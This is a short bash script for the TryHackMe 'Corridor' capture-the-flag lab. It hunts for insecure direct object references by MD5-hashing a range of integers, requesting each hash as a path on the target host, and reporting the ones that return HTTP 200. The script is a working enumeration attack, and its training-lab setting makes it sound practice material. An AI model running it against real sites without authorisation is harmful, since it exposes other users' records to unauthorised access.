#!/bin/bash
# IDOR Testing Script - Bash Version
# Corridor Challenge - TryHackMe
#
# Usage:
#   ./idor_test.sh <base_url> [range_start] [range_end]
#
# Examples:
#   ./idor_test.sh http://10.67.168.239
#   ./idor_test.sh http://10.67.168.239 -100 200

if [ -z "$1" ]; then
  echo "Usage: $0 <base_url> [range_start] [range_end]"
  echo ""
  echo "Examples:"
  echo "  $0 http://10.67.168.239"
  echo "  $0 http://10.67.168.239 0 50"
  exit 1
fi

BASE_URL="$1"
START="${2:--10}"
END="${3:-200}"

echo "=== IDOR Testing: $BASE_URL ==="
echo "Testing range: $START to $END"
echo ""

found_count=0

for i in $(seq "$START" "$END"); do
  # Generate MD5 hash
  hash=$(echo -n "$i" | md5sum | cut -d' ' -f1)
  
  # Test endpoint
  status=$(curl -s -o /dev/null -w "%{http_code}" "$BASE_URL/$hash")
  
  if [ "$status" = "200" ]; then
    # Get response size
    size=$(curl -s "$BASE_URL/$hash" | wc -c)
    echo "[200] ID=$i | Size=$size | Hash=$hash"
    ((found_count++))
  fi
done

echo ""
echo "======================================================================="
echo "SUMMARY"
echo "======================================================================="
echo "Accessible Endpoints (HTTP 200): $found_count"
